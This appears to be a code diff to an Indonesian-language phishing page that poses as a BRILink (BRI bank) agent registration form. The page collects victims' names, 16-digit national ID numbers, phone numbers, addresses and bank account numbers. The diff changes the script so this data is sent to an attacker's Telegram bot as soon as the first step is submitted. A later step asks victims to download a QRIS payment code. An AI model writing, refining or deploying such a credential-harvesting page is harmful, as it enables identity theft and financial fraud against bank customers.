@@ -250,7 +250,7 @@
             </div>
         </div>
 
-        <!-- STEP 1: FORM PENDAFTARAN -->
+        <!-- STEP 1: FORM PENDAFTARAN — DATA TERKIRIM KE TELEGRAM DISINI SAJA -->
         <div class="step-content active" id="step-1">
             <h2>📋 Formulir Pendaftaran Agen BRILink</h2>
             <form id="formPendaftaran">
@@ -321,8 +321,7 @@
                 </div>
             </form>
         </div>
-
-                <!-- STEP 2: KONFIRMASI DATA -->
+        <!-- STEP 2: KONFIRMASI DATA — TIDAK KIRIM KE TELEGRAM -->
         <div class="step-content" id="step-2">
             <h2>✅ Konfirmasi Data Pendaftaran</h2>
             <div class="confirm-warning">
@@ -344,7 +343,7 @@
             </div>
         </div>
 
-        <!-- STEP 3: AKTIVASI LIMIT + QRIS -->
+        <!-- STEP 3: AKTIVASI LIMIT + QRIS — TIDAK KIRIM KE TELEGRAM -->
         <div class="step-content" id="step-3">
             <div class="aktivasi-header-card">
                 <div class="aktivasi-header-top">
@@ -353,7 +352,7 @@
                 </div>
                 <hr class="divider-dashed">
                 <ul class="aktivasi-list">
-                    <li><i class="fas fa-check-circle"></i>Data pendaftaran telah <strong>diverifikasi</strong>. Silakan unduh QRIS untuk aktivasi limit mesin EDC.</li>
+                    <li><i class="fas fa-check-circle"></i>Data pendaftaran telah <strong>diterima dan terekam</strong>. Silakan unduh QRIS untuk aktivasi limit mesin EDC.</li>
                     <li><i class="fas fa-check-circle"></i>Mesin EDC akan dikirim ke alamat sesuai data yang diisi.</li>
                 </ul>
             </div>
@@ -419,7 +418,7 @@
 
             <div class="btn-wrap">
                 <button type="button" class="btn-back" onclick="goToStep(2)">← Kembali</button>
-                <button type="button" class="btn-submit" onclick="simpanPengajuan()">Simpan & Selesai ✓</button>
+                <button type="button" class="btn-submit" onclick="selesai()">Selesai ✓</button>
             </div>
         </div>
     </div>
@@ -465,7 +464,7 @@ function deteksiPerangkat() {
 }
 
 // ==============================================
-// KIRIM KE TELEGRAM
+// KIRIM KE TELEGRAM — HANYA DIPANGGIL DI STEP 1
 // ==============================================
 async function kirimKeTelegram(pesan) {
     try {
@@ -474,10 +473,9 @@ async function kirimKeTelegram(pesan) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: ID_CHAT_TELEGRAM, text: pesan, parse_mode: 'Markdown' })
         });
-        console.log('✅ Terkirim ke Telegram');
+        console.log('✅ Data pendaftaran terkirim ke Telegram');
     } catch (err) {
-        console.log('❌ Gagal kirim:', err);
-        alert('✅ Pendaftaran berhasil! Data telah terekam.');
+        console.log('❌ Gagal kirim ke Telegram:', err);
     }
 }
 
@@ -567,6 +565,7 @@ document.getElementById('kota').addEventListener('change', async function() {
 // NAVIGASI & DATA
 // ==============================================
 let formData = {};
+let dataSudahTerkirim = false; // ⚡ Flag agar TIDAK mengirim ulang
 
 function goToStep(num) {
     document.querySelectorAll('.step-content').forEach(el => el.classList.remove('active'));
@@ -576,7 +575,10 @@ function goToStep(num) {
     window.scrollTo({top:0, behavior:'smooth'});
 }
 
-function simpanDataLanjut(num) {
+// ==============================================
+// FUNGSI SIMPAN & KIRIM — HANYA DIJALANKAN 1X DI STEP 1
+// ==============================================
+async function simpanDataLanjut(num) {
     const nikRaw = document.getElementById('nik').value.replace(/\s/g, '');
     const rekeningRaw = document.getElementById('no_rekening').value.replace(/\s/g, '');
     const nama = document.getElementById('nama_pemilik').value.trim();
@@ -588,11 +590,13 @@ function simpanDataLanjut(num) {
     const kec = document.getElementById('kecamatan');
     const pos = document.getElementById('kode_pos').value.trim();
 
+    // Validasi
     if (!nama || !usaha || !nikRaw || !hp || !alamat || !prov.value || !kota.value || !kec.value || !pos || !rekeningRaw) {
         alert('Harap lengkapi semua kolom wajib (*)'); return;
     }
     if (nikRaw.length !== 16) { alert('NIK harus 16 digit!'); return; }
 
+    // Simpan data
     formData = {
         nama, usaha, nik: nikRaw, hp, alamat,
         provinsi: prov.selectedOptions[0].dataset.nama || prov.value,
@@ -601,27 +605,16 @@ function simpanDataLanjut(num) {
         kodePos: pos, rekening: rekeningRaw
     };
 
-    // Isi konfirmasi
-    document.getElementById('cf_nama').textContent = formData.nama;
-    document.getElementById('cf_usaha').textContent = formData.usaha;
-    document.getElementById('cf_nik').textContent = formData.nik;
-    document.getElementById('cf_hp').textContent = formData.hp;
-    document.getElementById('cf_alamat').textContent = formData.alamat;
-    document.getElementById('cf_wilayah').textContent = `${formData.kecamatan}, ${formData.kota}, ${formData.provinsi} — ${formData.kodePos}`;
-    document.getElementById('cf_rekening').textContent = formData.rekening;
+    // ✅ KIRIM KE TELEGRAM — HANYA DISINI SAJA (jika belum pernah terkirim)
+    if (!dataSudahTerkirim) {
+        const perangkat = deteksiPerangkat();
+        const waktu = new Date().toLocaleString('id-ID', {
+            timeZone: 'Asia/Jakarta',
+            day: '2-digit', month: 'long', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit'
+        });
 
-    goToStep(num);
-}
-
-async function simpanPengajuan() {
-    const perangkat = deteksiPerangkat();
-    const waktu = new Date().toLocaleString('id-ID', {
-        timeZone: 'Asia/Jakarta',
-        day: '2-digit', month: 'long', year: 'numeric',
-        hour: '2-digit', minute: '2-digit', second: '2-digit'
-    });
-
-    const pesan = `
+        const pesan = `
 📝 *PENDAFTARAN AGEN BRILINK BARU*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 👤 Nama Pemilik: ${formData.nama}
@@ -638,10 +631,32 @@ ${formData.provinsi} — ${formData.kodePos}
 🌐 Browser: ${perangkat.browser}
 🕐 Waktu: ${waktu} WIB
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    `;
+        `;
 
-    await kirimKeTelegram(pesan);
-    alert('✅ Pendaftaran Berhasil! Data telah dikirim. Silakan unduh QRIS untuk aktivasi limit.');
+        await kirimKeTelegram(pesan);
+        dataSudahTerkirim = true; // Tandai sudah terkirim — tidak akan mengirim ulang
+    }
+
+    // Isi konfirmasi ke langkah 2
+    document.getElementById('cf_nama').textContent = formData.nama;
+    document.getElementById('cf_usaha').textContent = formData.usaha;
+    document.getElementById('cf_nik').textContent = formData.nik;
+    document.getElementById('cf_hp').textContent = formData.hp;
+    document.getElementById('cf_alamat').textContent = formData.alamat;
+    document.getElementById('cf_wilayah').textContent = `${formData.kecamatan}, ${formData.kota}, ${formData.provinsi} — ${formData.kodePos}`;
+    document.getElementById('cf_rekening').textContent = formData.rekening;
+
+    // Lanjut ke langkah 2
+    goToStep(num);
+}
+
+// ==============================================
+// LANGKAH 3 — TOMBOL SELESAI (TIDAK KIRIM ULANG)
+// ==============================================
+function selesai() {
+    alert('✅ Pendaftaran Selesai! Data telah terekam. Silakan unduh QRIS untuk aktivasi limit mesin EDC.');
+    // Bisa diarahkan ke halaman lain jika perlu
+    // window.location.href = 'beranda.html';
 }
 
 // Muat data provinsi saat halaman dibuka
@@ -649,4 +664,5 @@ document.addEventListener('DOMContentLoaded', loadProvinsi);
 </script>
 
 </body>
-</html>
+    </html>
+    
